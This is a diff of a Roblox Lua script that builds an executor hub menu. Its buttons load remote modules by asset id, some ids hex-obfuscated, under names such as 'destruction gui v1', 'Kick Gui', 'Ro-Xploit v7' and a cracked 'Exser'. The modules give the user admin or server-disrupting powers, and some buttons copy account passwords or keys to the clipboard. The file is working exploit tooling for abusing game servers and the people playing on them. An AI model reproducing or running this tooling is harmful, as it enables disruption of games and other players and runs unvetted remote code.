+local guis=create2(UDim2.new(0,66,0,169),UDim2.new(0,56,0,35),12,"ByteGui v5",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(111093930782644).Private("'..player.Name..'")')
+exe('require(111093930782644).Private("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 128, 0, 169), UDim2.new(0, 56, 0, 35), "ss", 10, "Nooz93 Gui v7", scroll)
+local guis=create2(UDim2.new(0,128,0,169),UDim2.new(0,56,0,35),10,"Nooz93 Gui v7",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(131633407369490).v7("'..player.Name..'")')
+exe('require(131633407369490).v7("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 189, 0, 169), UDim2.new(0, 56, 0, 35), "ss", 14, "Sbb Gui", scroll)
+local guis=create2(UDim2.new(0,189,0,169),UDim2.new(0,56,0,35),14,"Sbb Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(13148311495).sdd("'..player.Name..'")')
+exe('require(13148311495).sdd("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 5, 0, 210), UDim2.new(0, 56, 0, 35), "ss", 12, "v00ggui v1", scroll)
+local guis=create2(UDim2.new(0,5,0,210),UDim2.new(0,56,0,35),12,"v00ggui v1",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(17148331102).v00ggv1yah("'..player.Name..'")')
+exe('require(17148331102).v00ggv1yah("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 66, 0, 210), UDim2.new(0, 56, 0, 35), "ss", 8, "destruction gui v1", scroll)
+local guis=create2(UDim2.new(0,66,0,210),UDim2.new(0,56,0,35),8,"destruction gui v1",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(9426868739):serverfuckerv1("'..player.Name..'")')
+exe('require(9426868739):serverfuckerv1("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 128, 0, 210), UDim2.new(0, 56, 0, 35), "ss", 8, "Mini g00by Gui", scroll)
+local guis=create2(UDim2.new(0,128,0,210),UDim2.new(0,56,0,35),8,"Mini g00by Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(77673101600856)("'..player.Name..'")')
+exe('require(77673101600856)("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 189, 0, 210), UDim2.new(0, 56, 0, 35), "ss", 6, "g00byd0lan Gui Remake", scroll)
+local guis=create2(UDim2.new(0,189,0,210),UDim2.new(0,56,0,35),6,"g00byd0lan Gui Remake",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(116475643574687).g00byd0lan("'..player.Name..'")')
+exe('require(116475643574687).g00byd0lan("'..Lp.Name..'")')
 setclipboard("User: g00byd0lan\nPw: rc7")
 end)
 
-local guis = createTextButton(UDim2.new(0, 5, 0, 251), UDim2.new(0, 56, 0, 35), "ss", 8, "Pepsi Gui v19", scroll)
+local guis=create2(UDim2.new(0,5,0,251),UDim2.new(0,56,0,35),8,"Pepsi Gui v19",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(113825094179678).pepsi("'..player.Name..'")')
+exe('require(113825094179678).pepsi("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 66, 0, 251), UDim2.new(0, 56, 0, 35), "ss", 6, "MrHaxorOficial Gui v8", scroll)
+local guis=create2(UDim2.new(0,66,0,251),UDim2.new(0,56,0,35),6,"MrHaxorOficial Gui v8",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(124749800282988).MrHaxorOfficial("'..player.Name..'")')
+exe('require(124749800282988).MrHaxorOfficial("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 128, 0, 251), UDim2.new(0, 56, 0, 35), "ss", 8, "3 Exploiters Gui", scroll)
+local guis=create2(UDim2.new(0,128,0,251),UDim2.new(0,56,0,35),8,"3 Exploiters Gui",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(103853640037661).T3EX("'..player.Name..'")')
+exe('require(103853640037661).T3EX("'..Lp.Name..'")')
 end)
 
-local guis = createTextButton(UDim2.new(0, 189, 0, 251), UDim2.new(0, 56, 0, 35), "ss", 10, "Ham00d Gui v1", scroll)
+local guis=create2(UDim2.new(0,189,0,251),UDim2.new(0,56,0,35),10,"Ham00d Gui v1",scroll)
 guis.MouseButton1Click:Connect(function()
-execute('require(105834175256340).H4M("'..player.Name..'")')
+exe('require(105834175256340).H4M("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 5), UDim2.new(0, 56, 0, 35), "ss", 10, "144kanz Hub", scroll2)
+local guis=create2(UDim2.new(0,5,0,292),UDim2.new(0,56,0,35),10,"k00p77Alt v4",scroll)
+guis.MouseButton1Click:Connect(function()
+exe('require(15833438747).k00p77v4("'..Lp.Name..'")')
+end)
+
+local guis=create2(UDim2.new(0,66,0,292),UDim2.new(0,56,0,35),10,"Darius gui v23",scroll)
+guis.MouseButton1Click:Connect(function()
+exe('require(15833438747).k00p77v4("'..Lp.Name..'")')
+end)
+
+local guis=create2(UDim2.new(0,128,0,292),UDim2.new(0,56,0,35),10,"777ililo gui v3",scroll)
+guis.MouseButton1Click:Connect(function()
+exe('require(134907549394378)("'..Lp.Name..'")')
+end)
+
+local guis=create2(UDim2.new(0,189,0,292),UDim2.new(0,56,0,35),10,"backroom",scroll)
+guis.MouseButton1Click:Connect(function()
+exe('')
+end)
+
+local ss=create2(UDim2.new(0,5,0,5),UDim2.new(0,56,0,35),10,"144kanz Hub",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(0x25b56b8f7+-0x6a72c6b3d+0x812296b09):SHHH144anzHUB("'..player.Name..'")')
+exe('require(0x25b56b8f7+-0x6a72c6b3d+0x812296b09):SHHH144anzHUB("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 5), UDim2.new(0, 56, 0, 35), "ss", 14, "Polaria", scroll2)
+local ss=create2(UDim2.new(0,66,0,5),UDim2.new(0,56,0,35),14,"Polaria",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(79176073803733).Pload("'..player.Name..'")')
+exe('require(79176073803733).Pload("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 5), UDim2.new(0, 56, 0, 35), "ss", 6, "matthew_isabot76RIP gui", scroll2)
+local ss=create2(UDim2.new(0,128,0,5),UDim2.new(0,56,0,35),6,"matthew_isabot76RIP gui",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(6912873833).matthew_isabot76RIP("'..player.Name..'")')
+exe('require(6912873833).matthew_isabot76RIP("'..Lp.Name..'")')
 setclipboard("dress code")
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 5), UDim2.new(0, 56, 0, 35), "ss", 14, "SF Pc v3", scroll2)
+local ss=create2(UDim2.new(0,189,0,5),UDim2.new(0,56,0,35),14,"SF Pc v3",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(132592022786319).SFV3PC("'..player.Name..'")')
+exe('require(132592022786319).SFV3PC("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 46), UDim2.new(0, 56, 0, 35), "ss", 12, "Sheldoni", scroll2)
+local ss=create2(UDim2.new(0,5,0,46),UDim2.new(0,56,0,35),12,"Sheldoni",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(15629007042)("'..player.Name..'")')
+exe('require(15629007042)("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 46), UDim2.new(0, 56, 0, 35), "ss", 8, "HD Admin Ranker", scroll2)
+local ss=create2(UDim2.new(0,66,0,46),UDim2.new(0,56,0,35),8,"HD Admin Ranker",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(7192763922).load("'..player.Name..'")')
+exe('require(7192763922).load("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 46), UDim2.new(0, 56, 0, 35), "ss", 12, "Kick Gui", scroll2)
+local ss=create2(UDim2.new(0,128,0,46),UDim2.new(0,56,0,35),12,"Kick Gui",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(4694654493).load("'..player.Name..'")')
+exe('require(4694654493).load("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 46), UDim2.new(0, 56, 0, 35), "ss", 10, "Harked v2", scroll2)
+local ss=create2(UDim2.new(0,189,0,46),UDim2.new(0,56,0,35),10,"Harked v2",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(4770241281):hark("'..player.Name..'")')
+exe('require(4770241281):hark("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 87), UDim2.new(0, 56, 0, 35), "ss", 14, "IY [Edit]", scroll2)
+local ss=create2(UDim2.new(0,5,0,87),UDim2.new(0,56,0,35),14,"IY [Edit]",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(15610593870)("'..player.Name..'")')
+exe('require(15610593870)("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 87), UDim2.new(0, 56, 0, 35), "ss", 10, "Exser [Cracked]", scroll2)
+local ss=create2(UDim2.new(0,66,0,87),UDim2.new(0,56,0,35),10,"Exser [Cracked]",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(0x308BC2E6B)["ExSer Cracked by LALOL Hub"]("'..player.Name..'")')
+exe('require(0x308BC2E6B)["ExSer Cracked by LALOL Hub"]("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 87), UDim2.new(0, 56, 0, 35), "ss", 10, "Exser [Modded]", scroll2)
+local ss=create2(UDim2.new(0,128,0,87),UDim2.new(0,56,0,35),10,"Exser [Modded]",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(13718034160):pls("'..player.Name..'")')
+exe('require(13718034160):pls("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 87), UDim2.new(0, 56, 0, 35), "ss", 10, "Mr Bean Admin", scroll2)
+local ss=create2(UDim2.new(0,189,0,87),UDim2.new(0,56,0,35),10,"Mr Bean Admin",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(10082319954){Owners={"'..player.Name..'"},Prefix="!"}')
+exe('require(10082319954){Owners={"'..Lp.Name..'"},Prefix="!"}')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 128), UDim2.new(0, 56, 0, 35), "ss", 12, "Ro-Xploit v7", scroll2)
+local ss=create2(UDim2.new(0,5,0,128),UDim2.new(0,56,0,35),12,"Ro-Xploit v7",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(96184029574075)("'..player.Name..'")')
+exe('require(96184029574075)("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 128), UDim2.new(0, 56, 0, 35), "ss", 12, "Earthy Hub", scroll2)
+local ss=create2(UDim2.new(0,66,0,128),UDim2.new(0,56,0,35),12,"Earthy Hub",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(5282751219):Fire("'..player.Name..'")')
+exe('require(5282751219):Fire("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 128), UDim2.new(0, 56, 0, 35), "ss", 12, "Sensation", scroll2)
+local ss=create2(UDim2.new(0,128,0,128),UDim2.new(0,56,0,35),12,"Sensation",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(100263845596551)("'..player.Name..'")')
+exe('require(100263845596551)("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 128), UDim2.new(0, 56, 0, 35), "ss", 12, "Trash Hub", scroll2)
+local ss=create2(UDim2.new(0,189,0,128),UDim2.new(0,56,0,35),12,"Trash Hub",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(17182254638)("'..player.Name..'")')
+exe('require(17182254638)("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 169), UDim2.new(0, 56, 0, 35), "ss", 14, "Sugma_v1", scroll2)
+local ss=create2(UDim2.new(0,5,0,169),UDim2.new(0,56,0,35),14,"Sugma_v1",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(11183244198):s("sugma",game.Players.'..player.Name..')')
+exe('require(11183244198):s("sugma",'..Lp.Name..')')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 169), UDim2.new(0, 56, 0, 35), "ss", 14, "T0PK3K v5", scroll2)
+local ss=create2(UDim2.new(0,66,0,169),UDim2.new(0,56,0,35),14,"T0PK3K v5",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(0x342D5F0DA)("'..player.Name..'")')
+exe('require(0x342D5F0DA)("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 169), UDim2.new(0, 56, 0, 35), "ss", 14, "T0PK3K v4", scroll2)
+local ss=create2(UDim2.new(0,128,0,169),UDim2.new(0,56,0,35),14,"T0PK3K v4",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(4671686633).die("'..player.Name..'")')
+exe('require(4671686633).die("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 169), UDim2.new(0, 56, 0, 35), "ss", 14, "T0PK3K v3", scroll2)
+local ss=create2(UDim2.new(0,189,0,169),UDim2.new(0,56,0,35),14,"T0PK3K v3",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(2609384717).load("'..player.Name..'")')
+exe('require(2609384717).load("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 210), UDim2.new(0, 56, 0, 35), "ss", 6, "Brickma Ultimate [Beta]", scroll2)
+local ss=create2(UDim2.new(0,5,0,210),UDim2.new(0,56,0,35),6,"Brickma Ultimate [Beta]",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(112945327108627).Brickma("'..player.Name..'")')
+exe('require(112945327108627).Brickma("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 210), UDim2.new(0, 56, 0, 35), "ss", 14, "Blast SS", scroll2)
+local ss=create2(UDim2.new(0,66,0,210),UDim2.new(0,56,0,35),14,"Blast SS",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(5596373023).load("'..player.Name..'")')
+exe('require(5596373023).load("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 210), UDim2.new(0, 56, 0, 35), "ss", 4, "Project Sonicelijahmania Beta", scroll2)
+local ss=create2(UDim2.new(0,128,0,210),UDim2.new(0,56,0,35),6,"Sonicelijahmania Beta",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(10973009971).sonic("'..player.Name..'")')
+exe('require(10973009971).sonic("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 210), UDim2.new(0, 56, 0, 35), "ss", 12, "Euphoria v1", scroll2)
+local ss=create2(UDim2.new(0,189,0,210),UDim2.new(0,56,0,35),12,"Euphoria v1",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(96844128852058).euphoria("'..player.Name..'")')
+exe('require(96844128852058).euphoria("'..Lp.Name..'")')
 setclipboard("euphoria-v1-1021922233")
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 251), UDim2.new(0, 56, 0, 35), "ss", 12, "Nezor v1.0", scroll2)
+local ss=create2(UDim2.new(0,5,0,251),UDim2.new(0,56,0,35),12,"Nezor v1.0",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(100227259985025):Ex("'..player.Name..'")')
+exe('require(100227259985025):Ex("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 251), UDim2.new(0, 56, 0, 35), "ss", 10, "Especialgui v2", scroll2)
+local ss=create2(UDim2.new(0,66,0,251),UDim2.new(0,56,0,35),10,"Especialgui v2",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(120934006054841):Especialgui("Solarivar")')
+exe('require(120934006054841):Especialgui("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 251), UDim2.new(0, 56, 0, 35), "ss", 12, "DevConsole", scroll2)
+local ss=create2(UDim2.new(0,128,0,251),UDim2.new(0,56,0,35),12,"DevConsole",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(6016746796):Console("'..player.Name..'")')
+exe('require(6016746796):Console("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 251), UDim2.new(0, 56, 0, 35), "ss", 14, "GwnHub", scroll2)
+local ss=create2(UDim2.new(0,189,0,251),UDim2.new(0,56,0,35),14,"GwnHub",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(15244529363).RAroblox("'..player.Name..'")')
+exe('require(15244529363).RAroblox("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 292), UDim2.new(0, 56, 0, 35), "ss", 10, "UTG + cmdbar", scroll2)
+local ss=create2(UDim2.new(0,5,0,292),UDim2.new(0,56,0,35),10,"UTG + cmdbar",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(0x2717f826c):Fire(game:GetService("Players"):FindFirstChild("'..player.Name..'") or game:GetService("Players"):FindFirstChild("'..player.Name..'"))')
+exe('require(0x2717f826c):Fire("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 292), UDim2.new(0, 56, 0, 35), "ss", 12, "Blue-Ex v1", scroll2)
+local ss=create2(UDim2.new(0,66,0,292),UDim2.new(0,56,0,35),12,"Blue-Ex v1",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(3309735650).blueexss("'..player.Name..'")')
+exe('require(3309735650).blueexss("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 292), UDim2.new(0, 56, 0, 35), "ss", 14, "CauaHub", scroll2)
+local ss=create2(UDim2.new(0,128,0,292),UDim2.new(0,56,0,35),14,"CauaHub",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(6174615549).CauaHub("'..player.Name..'")')
+exe('require(6174615549).CauaHub("'..Lp.Name..'")')
 setclipboard("102-291-2391-2129-219-2020")
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 292), UDim2.new(0, 56, 0, 35), "ss", 14, "Wary Gui", scroll2)
+local ss=create2(UDim2.new(0,189,0,292),UDim2.new(0,56,0,35),14,"Wary Gui",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(7107039922).Wary("'..player.Name..'")')
+exe('require(7107039922).Wary("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 333), UDim2.new(0, 56, 0, 35), "ss", 6, "project scripted v2.11", scroll2)
+local ss=create2(UDim2.new(0,5,0,333),UDim2.new(0,56,0,35),6,"project scripted v2.11",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(12240659272):Scripted("'..player.Name..'")')
+exe('require(12240659272):Scripted("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 333), UDim2.new(0, 56, 0, 35), "ss", 10, "Hatzone Gui v6", scroll2)
+local ss=create2(UDim2.new(0,66,0,333),UDim2.new(0,56,0,35),10,"Hatzone Gui v6",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(12415799679).HZV6("'..player.Name..'")')
+exe('require(12415799679).HZV6("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 333), UDim2.new(0, 56, 0, 35), "ss", 10, "Stratosphere", scroll2)
+local ss=create2(UDim2.new(0,128,0,333),UDim2.new(0,56,0,35),10,"Stratosphere",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(6590963180).load("'..player.Name..'")')
+exe('require(6590963180).load("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 333), UDim2.new(0, 56, 0, 35), "ss", 10, "Exoliner Admin", scroll2)
+local ss=create2(UDim2.new(0,189,0,333),UDim2.new(0,56,0,35),10,"Exoliner Admin",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(16988244323):FranksAdmin("Frank","'..player.Name..'")')
+exe('require(16988244323):FranksAdmin("Frank","'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 374), UDim2.new(0, 56, 0, 35), "ss", 10, "FSA Executor", scroll2)
+local ss=create2(UDim2.new(0,5,0,374),UDim2.new(0,56,0,35),10,"FSA Executor",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(0x6e9f5acb1a6d).FSA("'..player.Name..'")')
+exe('require(0x6e9f5acb1a6d).FSA("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 374), UDim2.new(0, 56, 0, 35), "ss", 10, "Linux Executor", scroll2)
+local ss=create2(UDim2.new(0,66,0,374),UDim2.new(0,56,0,35),10,"Linux Executor",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(0x549efed7c8f2).epic("'..player.Name..'")')
+exe('require(0x549efed7c8f2).epic("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 374), UDim2.new(0, 56, 0, 35), "ss", 10, "Saudi Gui v3", scroll2)
+local ss=create2(UDim2.new(0,128,0,374),UDim2.new(0,56,0,35),10,"Saudi Gui v3",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('require(75885601008770)("'..player.Name..'")')
+exe('require(75885601008770)("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 374), UDim2.new(0, 56, 0, 35), "ss", 10, "Backrooms", scroll2)
+local ss=create2(UDim2.new(0,189,0,374),UDim2.new(0,56,0,35),11,"HappyHub SS",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('')
+exe('require(110047253067635):Hload("'..Lp.Name..'")')
 end)
 
-local ss = createTextButton(UDim2.new(0, 5, 0, 415), UDim2.new(0, 56, 0, 35), "ss", 10, "Backrooms", scroll2)
+local ss=create2(UDim2.new(0,5,0,415),UDim2.new(0,56,0,35),10,"Backrooms",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('')
+exe('')
 end)
 
-local ss = createTextButton(UDim2.new(0, 66, 0, 415), UDim2.new(0, 56, 0, 35), "ss", 10, "Backrooms", scroll2)
+local ss=create2(UDim2.new(0,66,0,415),UDim2.new(0,56,0,35),10,"Backrooms",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('')
+exe('')
 end)
 
-local ss = createTextButton(UDim2.new(0, 128, 0, 415), UDim2.new(0, 56, 0, 35), "ss", 10, "Backrooms", scroll2)
+local ss=create2(UDim2.new(0,128,0,415),UDim2.new(0,56,0,35),10,"Backrooms",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('')
+exe('')
 end)
 
-local ss = createTextButton(UDim2.new(0, 189, 0, 415), UDim2.new(0, 56, 0, 35), "ss", 10, "Backrooms", scroll2)
+local ss=create2(UDim2.new(0,189,0,415),UDim2.new(0,56,0,35),10,"Backrooms",scroll2)
 ss.MouseButton1Click:Connect(function()
-execute('')
-end)
-
-local map = createTextButton(UDim2.new(0, 5, 0, 5), UDim2.new(0, 56, 0, 35), "map", 10, "Backrooms", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(12313683305).backrooms()')
-end)
-
-local map = createTextButton(UDim2.new(0, 66, 0, 5), UDim2.new(0, 56, 0, 35), "map", 8, "Golden Corral's", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(91736492445221).goldencorral()')
-end)
-
-local map = createTextButton(UDim2.new(0, 128, 0, 5), UDim2.new(0, 56, 0, 35), "map", 12, "Obby Map", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(7977633723).thisbacon()')
-end)
-
-local map = createTextButton(UDim2.new(0, 189, 0, 5), UDim2.new(0, 56, 0, 35), "map", 8, "Mountain House", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(7993365051).CLoad()')
-end)
-
-local map = createTextButton(UDim2.new(0, 5, 0, 46), UDim2.new(0, 56, 0, 35), "map", 10, "The Refinary", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(14080317322).Refinary()')
-end)
-
-local map = createTextButton(UDim2.new(0, 66, 0, 46), UDim2.new(0, 56, 0, 35), "map", 10, "Tantive Space", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(4081020916).loadmap()')
-end)
-
-local map = createTextButton(UDim2.new(0, 128, 0, 46), UDim2.new(0, 56, 0, 35), "map", 10, "CS:GO Office", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(3155301605).loadmap()')
-end)
-
-local map = createTextButton(UDim2.new(0, 189, 0, 46), UDim2.new(0, 56, 0, 35), "map", 12, "Guest house", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(4063168815).loadmap()')
-end)
-
-local map = createTextButton(UDim2.new(0, 5, 0, 87), UDim2.new(0, 56, 0, 35), "map", 10, "Space Elevator", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(5702244094).space("'..player.Name..'")')
-end)
-
-local map = createTextButton(UDim2.new(0, 66, 0, 87), UDim2.new(0, 56, 0, 35), "map", 14, "mosque", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(122050532527015).mosque("'..player.Name..'")')
-end)
-
-local map = createTextButton(UDim2.new(0, 128, 0, 87), UDim2.new(0, 56, 0, 35), "map", 16, "NDS", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(14704225060).nds("'..player.Name..'")')
-end)
-
-local map = createTextButton(UDim2.new(0, 189, 0, 87), UDim2.new(0, 56, 0, 35), "map", 10, "Prison life", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(14314506567).Load(PrisonLife)')
-end)
-
-local map = createTextButton(UDim2.new(0, 5, 0, 128), UDim2.new(0, 56, 0, 35), "map", 10, "2006 Map", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(6929171488).loadMap()')
-end)
-
-
-local map = createTextButton(UDim2.new(0, 66, 0, 128), UDim2.new(0, 56, 0, 35), "map", 10, "Mc Donalds", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(3168737443).load()')
-end)
-
-
-local map = createTextButton(UDim2.new(0, 128, 0, 128), UDim2.new(0, 56, 0, 35), "map", 10, "Dance Devils", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(6599453106).load()')
-end)
-
-
-local map = createTextButton(UDim2.new(0, 189, 0, 128), UDim2.new(0, 56, 0, 35), "map", 14, "Forest", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(16991266419)()')
-end)
-
-local map = createTextButton(UDim2.new(0, 5, 0, 169), UDim2.new(0, 56, 0, 35), "map", 16, "KFC", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(16662863386).kfc()')
-end)
-
-local map = createTextButton(UDim2.new(0, 66, 0, 169), UDim2.new(0, 56, 0, 35), "map", 8, "Indian Scam Center", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(16662858613).load("'..player.Name..'")')
-end)
-
-local map = createTextButton(UDim2.new(0, 128, 0, 169), UDim2.new(0, 56, 0, 35), "map", 8, "Lil Nas X Concert", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(16662877421).panini()')
-end)
-
-local map = createTextButton(UDim2.new(0, 189, 0, 169), UDim2.new(0, 56, 0, 35), "map", 10, "Waterpark", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(4781260949)()')
-end)
-
-local map = createTextButton(UDim2.new(0, 189, 0, 169), UDim2.new(0, 56, 0, 35), "map", 10, "Spongebob", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(16668637411).asd()')
-end)
-
-local map = createTextButton(UDim2.new(0, 189, 0, 169), UDim2.new(0, 56, 0, 35), "map", 7, "Zombie Apacolaypse", scroll3)
-map.MouseButton1Click:Connect(function()
-execute('require(12653566767).load("'..player.Name..'")')
+exe('')
 end)
